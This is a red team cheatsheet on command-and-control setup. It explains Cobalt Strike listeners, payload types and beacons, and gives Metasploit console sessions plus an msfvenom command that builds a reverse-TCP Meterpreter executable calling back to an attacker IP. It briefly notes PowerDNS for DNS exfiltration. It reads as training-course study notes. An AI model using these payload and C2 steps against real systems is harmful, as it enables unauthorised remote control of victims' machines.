# Red team

> Lots of things in this cheatsheet are taken from the great [Red Team Ops](https://training.zeropointsecurity.co.uk/courses/red-team-ops) course from ZeroPointZecurity

## C2

## Staged vs stageless handler

[Great article about the subject](https://buffered.io/posts/staged-vs-stageless-handlers/)

Staged :
- Minimal size pyaload
- Dumb stager
- Easily detected by an IDS

Stageless:
- Larger payload
- Fully encrypted communication
- Less likely to get caught by an IDS

### Cobalt strike

Run the team server

`sudo ./teamserver <server_IP> <password> <malleable_profile_file>`

Run cobalt strike client

Create a listener:
- Egress listener: egress listener is one that allows Beacon to communicate outside of the target network to our team server. Beacon will encapsulate C2 traffic over HTTP/S or DNS.
- Peer-to-peer: P2P listeners differ from egress listeners because they don't communicate with the team server directly.  Instead, P2P listeners are designed to chain multiple Beacons together in parent/child relationships. P2P listeners can either use SMB or raw TCP.

Create a payload:
- HTML application: a .hta file uses embedded VBScript to run the payload.  Only generates payloads for egress listeners and is limited to x86.
- MS Office Macro: a piece of VBA that can be dropped into a macro-enabled MS Word or Excel document.  Only generates payloads for egress listeners but is compatible with both x86 and x64 Office.
- Stager Payload Generator: a payload stager in a variety of languages including C, C#, PowerShell, Python, and VBA. Only generates payloads for egress listeners, but supports x86 and x64.
- Stageless Payload Generator: As above, but generates stageless payloads rather than stagers. No PowerShell, but has the added option of specifying an exit function (process or thread).  It can also generate payloads for P2P listeners.
- Windows Stager Payload: a pre-compiled stager as an EXE, Service EXE or DLL
- Windows Stageless Payload: a pre-compiled stageless payload as an EXE, Service EXE, DLL, shellcode, as well as PowerShell.  This is also the only means of generating payloads for P2P listeners.
- Windows Stageless Generate All Payloads: every stageless payload variant, for every listener, in x86 and x64.

Create a beacon

Run the beacon on the compromised machine, the beacon should now show in cobalt strike

Double click on you beacon, a new tab opens

You can now run cobalt strike commands on the machine from cobalt strike's CLI. To see all the commands use `help`. You can also use `help <command>` to get help for a specific command.

#### HTTP beacon

A HTTP beacon will automatically send check-in messages to show Cobalt Strike server that it's still alive. It will be considered dead after 3 missed check-ins. The default delay bewtween check-ins is 60s. You can change the beacon's check-in delay by using `sleep <seconds between check-ins>`.

> :warning: Although this is nicer for us because you don't have to sit around waiting for as long, you can appreciate how much noisier it is on the wire.  The more noise your C2 channel makes, the more likely it is to get caught.

#### DNS beacon

Due to the lower databand available of DNS the DNS beacon will not automatically check-in, so it will appear in the UI as "unknown" Beacon. You can use `checkin` to do manual check-in and see the metadata appear in Cobalt Strike.

### Metasploit

#### TCP Payloads

**TCP connection workaround**

Create a stageless listener:
```
msf exploit(handler) > set payload windows/meterpreter_reverse_tcp
payload => windows/meterpreter_reverse_tcp
msf exploit(handler) > set LHOST <attacker's IP>
LHOST => <attacker's IP>
msf exploit(handler) > set LPORT <backup port>
LPORT => <backup port>
msf exploit(handler) > set ExitOnSession false
ExitOnSession => false
msf exploit(handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter_reverse_tcp):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   EXITFUNC    process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   EXTENSIONS                   no        Comma-separate list of extensions to load
   EXTINIT                      no        Initialization strings for extensions
   LHOST       <attacker's IP>       yes       The listen address
   LPORT       <backup port>             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target

msf exploit(handler) > run -j
[*] Exploit running as background job.

[*] [2016.10.05-12:25:23] Started reverse TCP handler on <attacker IP>:<backup port>
msf exploit(handler) > [*] [2016.10.05-12:25:23] Starting the payload handler...
```

Create a matching payload for this listener:

```
$ msfvenom -p windows/meterpreter_reverse_tcp LHOST=<attacker IP> LPORT=<backup port> -f exe -o /tmp/stageless.exe
```

Create a staged listener with `LPORT` set to `<backup port>` and `ReverseListenerBindPort` to something different.

```
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(handler) > set ReverseListenerBindPort <initial port>
ReverseListenerBindPort => <initial port>
msf exploit(handler) > options

Module options (exploit/multi/handler):

Name  Current Setting  Required  Description
----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

Name      Current Setting  Required  Description
----      ---------------  --------  -----------
EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
LHOST     <attacker IP>    yes       The listen address
LPORT     <backup port>    yes       The listen port


Exploit target:

Id  Name
--  ----
0   Wildcard Target


msf exploit(handler) > run -j
[*] Exploit running as background job.

[*] [2016.10.05-12:29:48] Started reverse TCP handler on <attacker IP>:<initial port>
msf exploit(handler) > [*] [2016.10.05-12:29:48] Starting the payload handler...
```

Create a second payload for this listener, using `<initial port>` for `LPORT`.

When the staged payload runs, it will connect to Metasploit on port `initial port`. If the session needs to reconnect for any reason, Meterpreter will be responsible for that reconnection. Therefore, the configuration block will be referenced instead of the stager configuration, and it will use port `<backup port>` where the stageless listener is active. Here’s an example:

```
msf exploit(handler) >
[*] [2016.10.05-12:34:27] Sending stage (957999 bytes) to <compromised machine's IP>
[*] Meterpreter session 1 opened (<attacker's IP>:<initial port> -> <compromised machine's IP>:<compromised machine's port>) at 2016-10-05 12:34:29 +1000
msf exploit(handler) > sessions

Active sessions
===============

  Id  Type                   Information                           Connection
  --  ----                   -----------                           ----------
  1   meterpreter x86/win32  WIN-7CH5RT177BA\oj @ WIN-7CH5RT177BA  <attacker IP>:<initial port -> <compromised machine's IP>:<compromised machine's port> (<compromised machine's IP>)
meterpreter > sleep 5
[*] Telling the target instance to sleep for 5 seconds ...
[+] Target instance has gone to sleep, terminating current session.

[*] <compromised machine's IP> - Meterpreter session 1 closed.  Reason: User exit
msf exploit(handler) > [*] Meterpreter session 2 opened (<attacker's IP>:<backup port> -> <compromised machine's IP>:<compromised machine's port>) at 2016-10-05 12:35:55 +1000

msf exploit(handler) > sessions

Active sessions
===============

  Id  Type                   Information                           Connection
  --  ----                   -----------                           ----------
  2   meterpreter x86/win32  WIN-7CH5RT177BA\oj @ WIN-7CH5RT177BA  <attacker's IP>:<backup port> -> <compromised machine's IP>:<compromised machine's port> (<compromised machine's IP>)
```

#### HTPP/S payloads

For HTTP/S payloads they will automatically reconnect to the listener after a lost of connection wheither they are staged or not.

## DNS

You may want to use [PowerDNS](https://github.com/PowerDNS/pdns) to register a domain name. PowerDNS might also be usefull for dns exfiltration.

> To get a web interface for PowerDNS you can use [PowerDNS-Admin](https://github.com/PowerDNS-Admin/PowerDNS-Admin)